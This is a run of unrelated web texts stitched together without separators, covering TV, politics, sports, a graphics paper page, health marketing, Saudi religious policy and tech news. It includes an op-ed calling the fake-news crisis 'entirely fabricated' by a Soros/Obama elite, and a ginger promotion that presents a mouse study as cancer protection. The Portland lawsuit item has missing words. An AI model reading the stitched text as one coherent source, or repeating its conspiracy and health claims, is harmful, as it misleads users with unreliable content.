Why now? 2018 is the 30th anniversary of the pilot, and Goodman and Gilbert recently reunited on the family couch on The Talk. Plus, the Conners are one of TV's best-ever depictions of a blue-collar family living paycheck-to-paycheck (at least until they won the lottery), and many networks are “making a concerted effort to better reflect the lives of everyday Americans.”
But I know what you're thinking: how can Roseanne possibly do another season? Didn't Dan… y'know? As we found out in the polarizing series finale, yes, he did, but in 2009, Barr laid out her plans for a possible revival.
The glory days for population control by the elites was when they held all the key information sources of the people in their own hands – such as the “Big Three” television networks. That all began to change with the proliferation of the Internet when people could access primary sources and other pre-processed information for themselves. This sea change culminated in the elites' partial loss of control in 2016. This is the reason for the entirely fabricated “fake news” crisis and the sudden emergence of information-control laws across the globe. The U.S., U.K. and Germany (i.e. the Soros/Obama core of elite power) are in the process of establishing what can rightly be defined as a global “Ministry of Truth” straight out of the pages of reformed socialist George Orwell's “1984.”
It must be acknowledged that Orwell, who wrote this blood-chilling classic as a satire against socialism, has become in retrospect a prophet. His dystopian future of a society defined by perpetual war and thought control through propaganda is close to becoming our reality – despite the populist revolution. This stage play has by no means reached its final act.
We Americans consider ourselves the freest people from thought control and point to the Soviet model as the polar opposite of our system of a “free press” and unfiltered information sources. We mock and disrespect the Mainstream Media (MSM) while at the same time assuming that we are not being influenced by them – or that the elites who run them aren't smart enough to have deployed alternative media that creates the illusion of “fair and balanced” news coverage. But, how often do even the most cynical conservatives give credence to these same media in matters that dominate the news cycle which fall outside our areas of particular interest? We blast them for pro-abortion propaganda, for example, yet assume their reporting on things like U.S. military activity in Syria is objective and accurate.
The Syrian situation is representative of a much larger problem of information control by the elites that too many Americans still don't recognize, and how much the American press today not only doesn't differ from the old Soviet model but improves upon it.
Here's an example of how the propaganda works in the American version. I'm going to use as the example a normally trustworthy conservative-leaning source, the Washington Times. From the Dec. 26 article “Death knell sounds for Obama doctrine as Aleppo falls to Assad loyalists”:
“There is no doubt [President Obama] will be hammered in historical terms. The question will be why he didn't do more,” Aaron David Miller, a former presidential adviser on Middle East affairs, told Reuters. Mr. Obama's infamous “red line” warning in 2012 against Syria's use of chemical weapons against rebel forces pushed Washington and Damascus onto a collision course. … The Obama administration's approach to the ripple effects of the Arab Spring, which irrevocably changed the political landscape of the Middle East and North Africa, was tantamount to “a policy of calculated dithering,” said one top regional analyst.
This article is, of course, red meat for conservatives, but notice how it unquestioningly assumes that Obama's fault was in not taking more military action in Syria, and subtly invokes the “red line” Assad supposedly crossed, which supposedly should have triggered direct U.S. military intervention, which in turn supposedly proves Obama's weakness as a leader. That's “the narrative” for the conservatives. The elites have a narrative for every interest group, it's not just a leftist thing.
Obama is a weak leader, but not because he didn't go to war with Russia. And everyone seems to have forgotten that Syria's alleged violation of the “red line” was one of the most obvious set-ups in the history of “black ops.”
One of my favorite “fake news” sites is Zero Hedge, which recently warned that Trump will probably not be able to stop the globalists. I don't know if I entirely agree with this analysis, though I do know that assuming a Trump presidency represents anything more than a fighting chance will ensure our failure.
There's another international news story that has overly encouraged conservatives: the report that Romania's president has rejected the leftists' nomination of a Muslim for prime minister. Yes, that's hopeful on one hand, but in the article credit for bringing about this result was attributed to The Rise Project, a national journalist association funded by George Soros. The Rise Project is just one of the many nonprofit journalism projects around the world funded by Soros, and that should be greatly concerning to every truth-loving person on the planet.
It used to be a fundamental tenet of journalism that every news report should offer more than one perspective on the news, and that every perspective in dispute should be presented in a balanced way with opposing views honestly represented. Personal bias by individual journalists and editors had always tested that standard, but so long as it was in place and respected, the ethic of fair and balanced coverage uplifted the profession and justified the public's trust. Today, “advocacy journalism” (i.e. propaganda) is the norm, and omissions, misrepresentations and hidden false assumptions are ubiquitous.
Today the pretense of journalistic ethics by the MSM is laughable, and respect for the industry is in the toilet – a metaphor never so perfectly epitomized. Yet public scorn has not and will not bring necessary change. The public must demand – and enforce by pressure – the adoption of clearly and publicly stated standards for ensuring journalistic objectivity and the imposition of ideological balance in the newsrooms and editorial boards.
If the populists and conservatives do not force this change, we will never break our society free from the grip of the elites.
Plan B pill, also known as the morning-after pill Photo by Joe Raedle/Getty Images
A federal judge has ordered the government to allow the sale of emergency contraceptive pill Plan B One-Step without a prescription to any woman, no matter her age. The action effectively reverses a stunning decision by Heath and Human Services secretary Kathleen Sebelius, who, in 2011, overruled the Food and Drug Administration's decision to make the pill more widely available over-the-counter. Sebelius' intervention restricted over-the-counter sales of Plan B to women age 17 and older.
The judge's order is the latest move in a long legal battle that has seemingly pitted scientists (including some working for the FDA) and sexual health advocates against government officials and others who see a controversy in making the pill more widely available. That's despite significant scientific evidence that the pill is safe, does not encourage promiscuity, and does not cause an abortion. Judge Edward R. Korman's opinion referenced and dismissed a specific concern cited by both Sebelius and President Obama at the time of the 2011 intervention, namely that the pill could be harmful to 10- and 11-year-old girls:
“This case is not about the potential misuse of Plan B by 11-year-olds. These emergency contraceptives would be among the safest drugs sold over-the-counter, the number of 11-year-olds using these drugs is likely to be miniscule, the FDA permits drugs that it has found to be unsafe for the pediatric population to be sold over-the-counter subject only to labeling restrictions, and its point-of-sale restriction on this safe drug is likewise inconsistent with its policy and the Food, Drug, and Cosmetic Act as it has been construed. Instead, the invocation of the adverse effect of Plan B on 11-year-olds is an excuse to deprive the overwhelming majority of women of their right to obtain contraceptives without unjustified and burdensome restrictions.”
Calling Sebelius's action on the issue “arbitrary, capricious, and unreasonable,” Judge Korman ordered the government to lift age restrictions on Plan B One-Step (and generic versions) for over-the-counter sales within 30 days. Korman concluded, “The FDA has engaged in intolerable delays in processing the petition. Indeed, it could accurately be described as an administrative agency filibuster … The plaintiffs should not be forced to endure, nor should the agency's misconduct be rewarded by, an exercise that permits the FDA to engage in further delay and obstruction.”
According to the New York Times, the FDA and the Department of Health and Human Services have not commented yet on whether they will appeal the decision.
NEWTON (CBS) – Newton Yellow Cab, which has served Boston's western suburbs since the 1960s, is closing its doors for good on Wednesday.
The once-thriving business says it just couldn't compete with the ride-hailing companies like Uber and Lyft.
Kathi Peters started driving for the company in 1975 and has been dispatching since 1995.
Between the colleges and residents on the go, Peters says things were busy 24-7 until 5-6 years ago when Uber came along.
Newton Yellow cab doesn't even have a computer, let alone an app, so the phone doesn't ring much these days.
“He's very stuck in the 60s. It worked for a long, long time,” Peters said of the business' owner.
Peters added that the regulations and cost of medallions imposed on cab companies but not ride-hailing companies doomed business more than a lack of technology.
Wavelet Rasterization
This paper won the Best Paper Award at Eurographics 2011. A method for quickly calculating analytically box-filtered rasterizations of 2D polygons and 3D triangle meshes. Wavelets calculate a multiresolution image over a quadtree or octree that is robust to degenerate input.

Abstract
We present a method for analytically calculating an anti-aliased rasterization of arbitrary polygons or fonts bounded by Bezier curves in 2D as well as oriented triangle meshes in 3D. Our algorithm rasterizes multiple resolutions simultaneously using a hierarchical wavelet representation and is robust to degenerate inputs. We show that using the simplest wavelet, the Haar basis, is equivalent to performing a box-filter to the rasterized image. Because we evaluate wavelet coefficients through line integrals in 2D, we are able to derive analytic solutions for polygons that have Bezier curve boundaries of any order, and we provide solutions for quadratic and cubic curves. In 3D, we compute the wavelet coefficients through analytic surface integrals over triangle meshes and show how to do so in a computationally efficient manner.
Supplemental
This is an implementation of rasterizing a 3D triangle mesh into an octree of wavelet coefficients, from which a regular grid of function values is easily created. A small modification to the code can easily calculate function values over an octree also. The OBJ input format is somewhat restrictive, but the parser is blazing fast.
August 2, 2011: Can now load obj files with normals and texture coordinates, added some documentation, added an executable, and performed some bug fixes.
This is an implementation of rasterizing a 2D polygon or collection of Bezier curves. FreeType is used to extract curves from font files and as a comparison renderer. I have included a TrueType font, Vladimir, for convenience. The font comparison figure in the paper is the upper case 'T' of this type face.
This is the set of slides that I used in my presentation of the paper at Eurographics 2011.

Ron Vlaar has plunged his future into doubt by claiming he can do better than Aston Villa.
The 30-year-old centre-back, who impressed for the Netherlands at last year's World Cup, said: “I want to maximise my career and I think I can go a step higher.
“I will look at it and go quietly.”
It comes amid a period of overall uncertainty for Villa fans with owner Randy Lerner ready to sell the club and a mystery bidder poised to complete a takeover as early as next month.
(Image: Reuters)
Vlaar, who joined Villa from Feyenoord in 2012, has been offered a new deal with his current contract set to expire.
He attracted interest from Southampton after the Dutch surged to the World Cup semi-final last summer.
He remained at Villa Park, however, and helped the club to reach the FA Cup final.
In pictures - FA Cup final
Following their semi-final win over Liverpool he claimed that after Tim Sherwood's arrival as boss and the club's upturn in fortunes he was thinking of staying.
But he said: “I have a lot to consider. I will think about things.”
Meanwhile striker Darren Bent, who joined the Villans for £24million in January 2011, has been released on a free transfer.
He has signed a two-year deal with Championship side Derby with an option for a third year.
Many people love Chinese food. Others crave Indian, Korean, or Jamaican dishes. And usually it's because of one particular spice they all share…
In many parts of the world, it has been known for centuries for a different reason. And that's the one we're interested in today…
You see, this spice has great healing powers.
Traditional doctors in Asia, Africa, India, and South America have known it helps ease stomach problems and much more.
Modern-day scientists are finally catching on. They have tested this plant root in the laboratory. And once again, traditional doctors were right all along…
A previous study showed that it effectively fights colorectal cancer,1 the second leading cause of cancer death in America.2 The authors noted that this spice “…seem(s) to be promising for cancer prevention; however, further clinical studies are warranted to assess the efficacy and safety…”
And further clinical studies are exactly what we now have…
Because another group of researchers has confirmed it's a powerful weapon against prostate cancer. A cancer that you're all but guaranteed to get if you're a man who lives long enough.
The researchers from Georgia State University undertook the first study of its kind. Rather than assessing one compound from this plant root, they tested the whole thing to see how it affects cancer growth.3 And the results were very encouraging.
So what was it?
A whole ginger root.
Ginger Fights Cancer
Scientists implanted human prostate cancer in mice. The experiment lasted only eight weeks. But during that time, the whole ginger extract reduced tumors by as much as 56%. And it was completely safe.
Results indicate you'd need to eat about 3 ½ ounces of the whole root extract every day to see these kinds of benefits.4
The powerful antioxidants in ginger help stop free radicals from damaging genes. They stop cancer before it gets started. And they may even stop cancer cells from growing, researchers say.5
But of course, the wonders of this spice don't end there…
It also soothes the side effects of cancer treatment.
A study in India involved children and young adults with bone cancer. They were all getting chemotherapy. Could ginger root powder relieve their nausea and vomiting?
Half the children got ginger root powder capsules. Half got a placebo. The control group had significantly more moderate to severe nausea and vomiting, compared to the “ginger group.” The ginger group also had fewer delayed reactions to their treatment.6
Another large study involved women with cancer. They had surgery, and were taking the cancer treatment drug cisplatin. They started taking ginger capsules when they started the drug, and took it for five days. Ginger eased their nausea.7
In a different study, women took three ginger capsules daily for three days before starting chemotherapy. They took capsules for three days during treatment, too. The ginger really helped their nausea. Each capsule had 250 mg of ginger.8
Around the world, doctors prescribe ginger to treat the common cold, fever, sore throats, vomiting, motion sickness, arthritis, sprains, cramps, high blood pressure, and fever.
There are many ways to add ginger to your diet. You can buy raw ginger at a grocery store and make it into a tea. It's also available as a supplement. It comes in extract or capsule form… and you can get them online or at a health food store.

RIYADH (Reuters) - Saudi Arabia's ruling Al Saud royal family are trying to adjust their relationship with the country's strict Wahhabi school of Sunni Islam as they increasingly view the teachings of some of its ultra-conservative clergy as a domestic security threat.

Radicalisation of Muslims in the world's top oil exporter has led to domestic attacks and the involvement of Saudi citizens in jihadist movements in Iraq and Syria, while extreme religious practices have damaged efforts to boost employment.
Over the past decade the House of Saud has not only put in place measures to control clerics and their sermons, but has started to favour more modern clergy for top state positions.
Saudi rulers are also starting to reform areas once the exclusive domain of the clergy, such as education and law, and have promoted elements of national identity that have no religious component.
Saudi Arabia remains one of the most religiously conservative countries on earth, and the royal family are not cutting off the clergy or ditching Wahhabism's basic precepts, analysts and diplomats say.
They are instead attempting to foster a reading of its teachings that distances it from Islamist militants such as Islamic State, and which better meets the demands of a modern economy.
“They've been pushing for a more national Wahhabism, one that is more modern in its outlook, one that is better in terms of the kingdom's image overseas, one that is more economically suitable,” said Stephane Lacroix, author of Awakening Islam, a book about religious politics in Saudi Arabia.
Spokesmen for the government could not immediately be reached for comment.
Saudi Arabia's approach to religious doctrine is important because of its symbolic position as the birthplace of Islam, while its oil exports allow it to finance Wahhabi-oriented missionary activity abroad.
ULTRA-CONSERVATIVE
The Wahhabi clergy has been close to the Al Saud dynasty since the mid 18th century, offering it Islamic legitimacy in return for control over parts of the state and a lavish religious infrastructure of mosques and universities.
“The royal family's legitimacy is mostly based on Islam. Without this, the House of Saud is weak. But, politically, religion gives them the strong legitimacy,” said Mohsen al-Awaji, a prominent Islamist activist.
Traditional Wahhabi doctrine is ultra-conservative, viewing Shi'ites as heretical, arguing against interaction with non-Muslims, opposing gender mixing, imposing a strict version of Islamic law and urging resumption of early Muslim practices.
Clerical control over education contributed to Islamist extremism among young Saudis, the royal family believe, which led to domestic security problems, and produced graduates with little grasp of subjects such as maths or foreign languages.
The senior clergy — under pressure from King Abdullah — have denounced militant Islamic doctrines, such as those of al Qaeda or Islamic State, but they still preach intolerant views.
They hinder efforts to reform the economy by arguing against women's employment, obstructing changes in the school curriculum to encourage technical subjects and blocking legal reform.
But the government now vets clerics in Saudi Arabia's 70,000 mosques, sacking many who disseminate extremism.
“Since 2005, since King Abdullah took power, he brought new ideas for the future,” said Mohammed al-Zulfa, a liberal former member of the appointed Shoura Council, which advises the government.
NATIONALISM
Meanwhile, more modern-thinking clerics are being promoted and the top clerical council has been opened up to include scholars from the other main branches of Sunni jurisprudence beyond the Hanbali school followed by Wahhabis.
That council is dominated by older conservatives such as Saleh al-Fawzan and Saleh al-Luhaidan, who once called for Muslim media owners who broadcast “depravity” to be executed.
In contrast, Mohammed al-Issa, the Justice Minister, and Abdulatif Al al-Sheikh, head of the religious police, are cited by liberals as the sort of more moderate Wahhabi cleric that reformers in the royal family want to promote.
Both have fallen foul of conservatives for trying to modernise religious institutions.
Another younger and comparatively liberal cleric, former Mecca religious police chief Ahmed al-Ghamdi, was denounced by older conservative Wahhabis this week for appearing on television with his wife, whose face was uncovered.
Meanwhile the government has promoted an alternative narrative of Saudi identity that keeps Wahhabism as a central focus, but still allows secular themes such as nationalism and cultural heritage that predates Islam to shine.
It has increased national day celebrations that were previously attacked by clerics as undermining religious feeling, and is promoting heritage sites, like the Nabatean rock temples, once seen as embarrassing in the land of Islam.
But it is not clear the whole ruling family supports efforts to reduce the influence of Wahhabism, which gives legitimacy to the Al Saud, said Lacroix.
“A lot of people in the royal family may see it as suicidal,” he said.
Judgment day is coming for the city of Portland and questionable projects that have shaky ties to water, sewer and stormwater rates.
A
asks a Multnomah County judge to declare that the city improperly spent millions of dollars in ratepayer money on projects such as the
headquarters and the
in east Portland.
The judge should order that any misspent money be returned to ratepayers, the lawsuit argues, and that an independent auditor be appointed to identify all improper expenditures since 2000.
"There needs to be consequences and accountability," said lobbyist Kent Craford, who has been leading efforts against rising utility rates and tangential spending.

unless the City Council took "immediate action to provide redress for these unauthorized expenditures and rectify its future policies." City officials didn't respond and have generally declined to comment, citing the anticipated litigation.
The lawsuit highlights millions of dollars worth of projects funded by Portland's
and
bureaus.
Many have been highlighted in stories in The Oregonian and in
. They include:
to prevent development and additional storm runoff;

.
Although each is a big-ticket item, they represent just a drop in the bucket for overall city sewer and water spending. Some environmentalists -- defending land acquisition for the storm water benefits -- have suggested the lawsuit mainly would benefit companies that have massive utility bills, not regular ratepayers.
"It really has been a full-frontal assault" on various projects, said Bob Sallinger, conservation director for the
. "I think they've been demagogued, they've been used to undermine confidence in the (sewer) agency without looking deeply at what the money's going for and the justification."
Joining the Water Accountability group in the lawsuit are real estate agent Millard Christner; Paige Craford, who is Craford's sister; and Lloyd Anderson, a Portland commissioner from 1970-73.
DiLorenzo said "the law isn't overly developed" on utility spending. He expects city attorneys will try to have the case dismissed, or they may argue that state law gives politicians more leeway than the city charter over spending decisions.
If the case moves forward, he said, it could take more than a year to resolve.
"We've got some very interesting legal issues that I'm sure we're going to debate with the city attorney," he said. "But I think we're on the side of justice in this one. And I am willing to venture a guess that the majority of the citizens of Portland agree with us."
Late last night, Spotify hit version 5.0 for Windows Phone with an all new design. Although some people have mixed opinions on certain UI aspects, one thing for certain is that Spotify is a very popular music service for mobile.
The Xbox One lets users snap apps so that music can continue to play while you do others things on the gaming and entertainment console. Seeing as we now have Pandora for Xbox One in addition to Xbox Music, Spotify would seem like an ideal candidate.
On the official Spotify Ideas section for the streaming music company, customers can put forth new thoughts for the Spotify app and service. One idea, that is gaining traction, is one for an Xbox One Spotify app.

Pavel Datsyuk Dan Milstein

(The Associated Press)
DETROIT - Pavel Datsyuk left the Detroit Red Wings with a huge void in their lineup and potentially $7.5 million of dead salary-cap space because he opted not to fulfill the final year of his contract.
But general manager Ken Holland said he has no hard feelings toward one of the most electrifying players and top two-way centers in franchise history.
"He gave us 14 years of incredible hockey," Holland said Saturday at Joe Louis Arena, following Datsyuk's announcement that he is returning to Russia to play in the KHL. "He never complained. He just played hard. He's a 200-foot player.
"He helped us win the Stanley Cup in '02 and '08, brought people out of their seats. Great leader, great role model.
"I have no ill will whatsoever towards the Pavel Datsyuk camp. He was an incredible Red Wing."
Datsyuk has wanted to return to Russia for years to be closer to his 13-year-old daughter, Elizabeth, who lives there with Datsyuk's ex-wife.
Nobody is begrudging him for that. The issue is why he signed a three-year extension in 2013 knowing the club would be saddled with his cap hit if he departed sooner (per CBA rules for contracts that take effect when a player is 35 or older).
Datsyuk took full responsibility Saturday during his news conference at Orchard Lake St. Mary, saying he knew the rule.
"I (put) my team in a tough situation," Datsyuk said. "When I come back after lockout year (2013), my mind is kind of 'I want to go home, I want to go home.' This time also I want to keep playing here. I just can't (make up) my mind. I (think) I will be OK with another three years, but as it goes farther and farther, it make it harder and harder. Now I just think it's not fair and (I'm) heading back home."
Holland said he doesn't believe Datsyuk fully comprehended the rule. He believes there was miscommunication between Datsyuk and his former agent, Gary Greenstin.
Greenstin told Holland that Datsyuk wanted to retire a Red Wing and asked for a five-year contract in 2013 (when Datsyuk had one season remaining on his current deal). Holland only felt comfortable with three years. They agreed to a $22.5 million deal.
The first indication Holland received that Datsyuk wasn't going to fulfil the entire contract came during the 2014 preseason, when Datsyuk told him he wanted to return to Russia after the season. Holland spent the rest of the season explaining to Datsyuk the cap ramifications.
Datsyuk, in the meantime, hired a new agent, Dan Milstein, and they, along with Holland, met with team owners Mike and Marian Ilitch in June 2015. Holland told Datsyuk and Milstein that the club wouldn't try to prevent him from playing in Russia in 2016-17 if he remained in Detroit for one more season. Datsyuk agreed.
Holland explained why he didn't simply sign Datsyuk to a one-year extension in 2013?
"He's a star, he's our best player," Holland said. "His agent walked in and wanted to do a five-year deal. What do you think would have happened if I countered with a one-year deal? He would have been on another team.
"Hindsight's 20-20. I don't think Pav had a conversation with Gary Greenstin about when he wanted to retire. I think that when Pav signed a contract he wanted to be here and when he got into the start of the first year, for the reasons that you heard today (family), he made a decision that he didn't want to be in the National Hockey League anymore, he wanted to go back home."
Holland said Datsyuk is an honorable person.
"Pav didn't do this knowingly," Holland said. "Certainly I'm disappointed that he's not going to honor the '16-17 season, but I've spent 18 months talking to him and Dan Milstein and I understand the reasons why. His heart isn't here anymore."
Holland said he doesn't feel burned by Greenstin, who he doesn't believe intentionally deceived them. Greenstin couldn't be reached for comment.

With the embarrassing policies reported in the first three weeks of the legislative session, it should be a wake-up call that voter apathy is harming Oklahoma. This past election, Oklahoma saw the worst voter turnout in our recorded history. This rate of 40.7 percent of registered voters going to the polls signaled one of the worst state levels of electoral apathy. Nationwide, turnout was the lowest for midterm presidential races since World War II.
I wish voter apathy was a one-time occurrence for our state. We need only look back one election cycle to see concerns. The U.S. Census Bureau reported of the 50 states and Washington, D.C., Oklahoma ranked 49th in eligible voter turnout. Only Hawaii and West Virginia had poorer performances. Statistics published by Oklahomans for Ballot Access Reform show voting rates for all age groups declined from 2008 to 2012 except 65- to 74-year-olds. The rate of increase in this age group grew from 68.1 percent to 80.7 percent. In contrast, Oklahomans age 18 to 24 voted at a rate of 41 percent in 2008, but declined four years later to a 27-percent rate.
I still remain an optimist that our state will overcome this electoral apathy. Bad press from elected officials should be enough to infuriate Oklahomans to not only cast ballots, but to also get involved, maybe even running for an office.
If you want to initiate positive change, begin with your political party.
If you are a registered Republican, attend upcoming county meetings, and then the state convention on April 11. More information can be found at www.okgop.com or call the office at (405) 528-3501.
If you are a registered Democrat, precinct meetings will be March 12. County conventions will be April 11. The five district conventions are split between May 2 and May 9. The state convention is May 30. More information is at www.okdemocrats.org or call the office at (405) 427-3366.
On a final request, also attend the education rally at the state Capitol on March 30 and demand responsible, intelligent policies.
Show up and bring a positive influence. Your voice might be the difference in shaping laws that better our state and hopefully ending the shame coming from our state Capitol.

Don't look for many clues about voter opinions in today's election. (Official White House Photo by Pete Souza)
With Republicans on the cusp of seizing control of the Senate, the next few days are likely to be filled with one of recriminations for the White House -- what went wrong, how voters have fallen out of favor with President Obama, how Americans newly trust the GOP to lead the country.
And there will be some truth to that: Obama's job approval numbers are way low and, on many issues, voters do say they trust Republicans more than Democrats.
But voters are a confused lot. Yes, they have fallen out with Obama, but on the biggest issues facing Congress, they still agree with Democrats on ... almost everything. That includes issues like raising the minimum wage, making the rich pay more in taxes, letting illegal immigrants stay in the United States, taking action to stem global warming, legalizingsame sex marriage and fixing the Affordable Care Act rather than repealing it.
It's even crazier than that, though. Republicans in Congress get lower approval ratings than Democrats in Congress, even as Americans are planning to send more Republicans to Congress.
So what's going on? Well, it's well widely known that voters almost always vote against the incumbent president in the mid-term election year.
There have been only three exceptions in the past 80 years: 1934, 1998 and 2002. Political scientists have a variety of explanations for the phenomenon, but it's important to remember Obama is not suffering a specific repudiation; he's suffering from the natural laws of politics.
The Senate map was especially bad for Democrats this year, with several retirements in red states. The demographics of the 2014 mid-terms are also bad, with key Democratic constituencies -- such as minorities and the young -- more likely to sit out.
That flips in 2016, when the map and the presidential election may be more favorable to Democrats. It's the tidal flows of politics, not much more.
So, no, voters aren't registering any specific policy preference with their votes today. Rather, specific candidates might win in specific states because of structural factors that affect every mid-term election and random facts of this year.
Republicans will certainly draw a different lesson, seizing on their victories as evidence that voters back their views on major issues.
As polling shows, this is not the case. But voters seldom influence what Congress actually does, as this chart from political scientists Martin Gilens and Benjamin I. Page shows.
You'll see there's a roughly 1 in 3 chance that Congress will take a particular action, regardless of whether a large majority or a tiny majority of Americans supports that action. It's economic elites and interest groups that make the difference, Gilens and Page find.
Moen, the number-one faucet brand in America, has committed to serve as the primary sponsor of the #72 Monster Energy NASCAR Cup Series entry with driver Cole Whitt for this weekend's race at the famed Indianapolis Motor Speedway (IMS).
Moen is dedicated to designing and delivering beautiful products that last a lifetime - all over the world. They offer a diverse selection of thoughtfully designed kitchen and bath faucets, showerheads, accessories, bath safety products, garbage disposals and kitchen sinks for residential and commercial applications each delivering the best possible combination of meaningful innovation, useful features, and lasting value.
"I'm looking forward to having Moen back with us for Indy", said Whitt. "We've had an ongoing relationship for years and appreciate their continued support."
Having a previously established relationship with Whitt, it was a natural fit to have Moen adorn the hood of the #72 at the track most known for its iconic history, where Whitt has three previous MENCS starts, completing 487 laps at the 2.5-mile, quad-oval. Eager to cross the bricks and secure a solid finish, Whitt and the #72 team are ready for action at IMS.

Hello everyone. We have indeed heard your concerns for hit detection within the game and we want to address it.
We already knew we had improvements that could be made, but after further investigation, we can share that the problem you experience is based off multiple issues that we will be working on. Some of them can be addressed with quick fixes, while others require development time.
BUGS ON REPLICATION AND KILLCAM
Let's start by talking about quick fixes. We have a few bugs that we managed to get out of the way and that will be fixed for our next title update in mid-December:
Fixed: Pawn rotation latency: the difference between a player's action, the server's perception and another player seeing said action had an extra delay due to a bug. This had even more impact on shield wielding Operators since sometimes players using those would think they were protected while they were not because of the additional delay caused by the pawn rotation bug.
Fixed: Shield positioning while rappelling: certain shield angles were not being replicated properly, this caused the shield wielding player to be overprotected in certain cases. This caused hit detection issues for the player shooting at the shield wielding player.
Fixed: Shooting and moving while rappelling: when moving and shooting while in rappel, the hits were sometimes not registered properly by the server.
Improved: Kill cam replication issues: the kill cam was not displaying an accurate representation of hit positions. The point of view seen after death was not the exact point of view of the killer. Moreover, we have instances in which the kill cam shows body parts sticking through walls while they actually weren't being seen from the killer's perspective. This has been improved for the next title update, but we still need additional work on this. It is still considered under development.
SERVER TICK RATE
We are currently investigating having a higher tick rate, which would improve positioning and shooting replication. The current servers run at a tick rate of 64, but the position of players is updated 30 times per second. We have plans to address this very soon and are currently running tests in which we have a position update rate of 60. If the results are satisfying, we will be deploying this in a future update as soon as possible.
CONNECTION TO WRONG DATA CENTER
Another issue we will be working on is that right now, some players connect to the wrong data centers. If you are not connected to the nearest data center, your gameplay experience will likely not be ideal. We believe that the best solution for this will be to allow the players to select their data centers and that is what we will be working on.
GENERAL ISSUES WE ARE AWARE OF
Although we do have a high ping kick in place, one thing to note is that there are some edge cases in which some players have high ping due to poor internet connection spikes. This affects replication quality for the other players within that person's match.
We hope that this addresses your concerns and we will make sure to keep you updated as we keep monitoring and improving on this and progress within our plans.
Vkontakte, a social networking site known as the “Facebook of Russia”, is facing legal action from nine music labels including EMI, Sony and Warner over what they claim is the unlawful distribution of some 6,000 tracks of licensed music on the site from artists like Madonna, Linkin Park, Metallica and Beyonce. The lawsuits are being prepared for filing after the holidays, according to the Russian newspaper Izvestia.
Pavel Durov, the founder and CEO of Vkontakte, says the site is prepared to negotiate with them, as it has with video rightsholders. “If some music companies wish their content to be deleted from VK, we, as always, are willing to comply with their wish,” he told TechCrunch. “On the other hand, we are also ready to seek mutually beneficial ways to monetize their content. This year we managed to find such a solution for video content and we are optimistic about the audio section of VK as well.
“Of course, if no agreement with large record companies is reached, their content will be deleted and VK music service will rely mostly on independent artists.”
If the suits go ahead, they look like they may be some of the first big moves from music rightsholders to go after a major site in the wake of a new anti-piracy law in the country designed to protect copyright better.
That law originally was aimed to focus more on video content but there are some who hope to extend it to include music. The law enforces improved communication by requiring site owners to provide easy-to-find contact details, including real-world addresses, and forms for rightsholders to file complaints faster. If a site fails to comply with an infringement complaint, it faces a block at the ISP level.
Leonid Agronov, the head of Russia's National Federation of the Music Industry (Russia's RIAA), told Izvestia that his organization has long been trying to negotiate with Vkontakte over music distributed through its site. The NFMI claims that Vkontakte does not pay for streamed plays, neither by charging users directly nor by paying the licensing fee directly. But that does not mean that the social network is not profiting.
“[Vkontakte] shows ads while people listen to music. So they make money on it,” he said.
In the case of removing these tracks, it puts Vkontakte in a double bind, where it's damned if it doesn't and damned if it does: on the one hand, it risks legal action from larger companies and potential ISP blockage; on the other, it faces backlash from its users, who look to it as a content portal.
This is not Vkontakte's first brush with copyright holders. Izvestia notes that in June of this year, the site — which has become a go-to place for users in Russia for music and other digital content sharing (including a lot of legal content) — took down some 7,000 music tracks. Then in August, Vkontakte signed a deal with UK monitoring company Muso to track and remove illegal music from the site. Muso's CTO and co-founder James Mason tells me that it continues to work with Vkontakte to take down free music that infringes the copyright rightsholders that Muso represents.
“Over the years VK has become the principal tool for music discovery among Russian-speaking population,” Durvo says. “As a result, there are plenty of artists and music companies that use VK as the main way to promote their work. We hope that more and more talented artists will get exposure with the use of our music service.”
In January 2012, Vkontakte lost a case against Russian label Gala, which said the site was allowing users to upload and share tracks by Russian artists in breach of copyright law. It was fined $7,000. It has won other cases, such as a case against Russian label Soyuz this past October, again over copyright.
It is also not Vkontakte's first brush with Russian legal forces. In May this year, the Russian regulator Roskomnadzor blocked the site. Although it claimed to have done this by mistake, the move was a bit close to the bone, considering that the site has been a strong advocate of free speech, including content critical of the government. One of the social network's investors, United Capital Partners, has ties to the Kremlin. It picked up its stake in Vkontakte in a secondary sale.
Russia is Europe's biggest internet market with over 61 million users. But it also has the more dubious distinction of being one of the worst repeat offenders globally when it comes to digital content copyright infringement. That has been one of the big gating factors for legit services to enter the market — not least because those businesses may actually find it hard to find paying users, when free (but illegal) content is so easy to get.
But with companies like Apple finally launching iTunes in the country, the tides are slowly shifting — something regulators have been hoping to encourage with anti-piracy legislation.
According to analysts at TNS, Vkontakte is one of the most visited sites in Russia, overall coming in third after portals like Mail.ru and Yandex (which each account for some 30 aggregated URLs). Looking specifically at Moscow, Russia's biggest and pace-setting market, Vkontakte is the leader among under-24s and third in the 25-34 age bracket:
In this particular case, which will be filed in court in St Petersburg (where Vkontakte is based), the plaintiff group includes a mix of international and Russian labels: Sony, Universal Music, Warner Music, EMI, Gala, Navigator, Studio Soyuz and Nikitin Media. The case could last between a couple of months and two years, Izvestia writes.
Updated with comment from Vkontakte CEO Pavel Durov and Muso CTO James Mason.
In Season 2 of Game of Thrones, Varys told Tyrion Lannister, upon his return to King's Landing to serve as Hand of the King in his father's stead, that “Even a small man can cast a very large shadow.” We learned in the Season 3 premiere that the opposite can also be true. In an episode full of subtext about honor and power—which are often mutually exclusive in Westeros—the great and powerful Tywin Lannister revealed just how small and petty a man he really is.
In case you didn't undertake a marathon refresher of Season 2: Tyrion organized the defense of King's Landing, sinking most of Stannis Baratheon's fleet into Blackwater Bay with the help of the alchemists' wildfire, and then went out beyond the safety of the castle walls for a little hand-to-hand combat. (Joffrey, meanwhile, chickened out.) Of course, Tywin teamed up with the Tyrells and Renly Baratheon's former army at the last minute to win the battle, but there would have been no King's Landing left for him to save if not for Tyrion. Tyrion's reward? An assassination attempt and a dingy room.
Probably figuring he has nothing to lose, Tyrion visits his father seeking a little gratitude and, oh, while he's at it, Casterly Rock, the family's castle. Tywin is, shall we say, less than amused. So little so that he launches a rant so epic that he doesn't even notice that he's contradicting himself. First, he dismisses Tyrion's plea for recognition by telling him, “Jugglers and singers require applause. You are a Lannister.” But it turns out Tyrion isn't really a Lannister once he demands the old family homestead. “Men's laws give you the right to bear my name and display my colors, since I cannot prove that you are not mine. … Neither gods nor men will ever compel me to let you turn Casterly Rock into your whorehouse.”
